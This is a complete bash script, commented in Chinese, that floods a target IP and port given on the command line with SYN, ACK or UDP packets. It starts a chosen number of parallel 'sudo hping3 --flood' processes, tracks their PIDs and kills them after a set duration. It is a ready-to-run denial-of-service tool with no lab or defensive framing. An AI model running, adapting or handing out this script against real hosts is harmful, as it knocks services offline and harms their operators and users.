#!/bin/bash

# 检查输入参数
if [ $# -ne 5 ]; then
    echo "Usage: $0 <target_ip> <target_port> <attack_type> <thread_count> <duration>"
    echo "Attack types: syn, ack, udp"
    exit 1
fi

# 获取命令行参数
TARGET_IP=$1
TARGET_PORT=$2
ATTACK_TYPE=$3
THREAD_COUNT=$4
DURATION=$5

# 显示攻击信息
echo "开始对 $TARGET_IP:$TARGET_PORT 进行攻击，攻击类型：$ATTACK_TYPE，线程数量：$THREAD_COUNT，持续时间：${DURATION}秒"

# 定义攻击命令
attack_syn() {
    echo "发起 SYN Flood 攻击..."
    sudo hping3 -S --flood -p $TARGET_PORT $TARGET_IP &
    echo $! >> attack_pids.txt
}

attack_ack() {
    echo "发起 ACK Flood 攻击..."
    sudo hping3 -A --flood -p $TARGET_PORT $TARGET_IP &
    echo $! >> attack_pids.txt
}

attack_udp() {
    echo "发起 UDP Flood 攻击..."
    sudo hping3 -2 --flood -p $TARGET_PORT $TARGET_IP &
    echo $! >> attack_pids.txt
}

# 启动攻击进程并记录 PID
> attack_pids.txt  # 清空 PID 文件
case $ATTACK_TYPE in
    syn)
        for ((i=1; i<=$THREAD_COUNT; i++)); do
            attack_syn
        done
        ;;
    ack)
        for ((i=1; i<=$THREAD_COUNT; i++)); do
            attack_ack
        done
        ;;
    udp)
        for ((i=1; i<=$THREAD_COUNT; i++)); do
            attack_udp
        done
        ;;
    *)
        echo "无效的攻击类型！请使用 syn, ack 或 udp。"
        exit 1
        ;;
esac

# 提示攻击已启动
echo "$THREAD_COUNT 个线程已启动，攻击将在 ${DURATION}秒后停止..."

# 等待指定时间后停止攻击
sleep $DURATION

# 停止所有攻击进程
echo "攻击时间已到，正在停止所有攻击..."
while read -r pid; do
    kill -9 $pid 2>/dev/null
done < attack_pids.txt

# 清理 PID 文件
rm -f attack_pids.txt

echo "所有攻击已停止。"
